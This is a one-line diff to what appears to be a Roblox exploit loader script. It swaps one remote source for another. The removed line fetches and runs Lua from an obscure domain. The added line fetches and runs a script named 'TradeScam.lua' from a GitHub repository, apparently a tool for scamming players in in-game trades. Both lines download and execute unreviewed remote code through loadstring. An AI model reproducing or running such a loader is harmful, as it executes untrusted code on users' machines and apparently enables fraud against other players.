@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("https://egorikusa.space/68242a88f58dc4a48bbf8941.lua", true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/wertaler/TradeScam/refs/heads/main/TradeScam.lua"))()
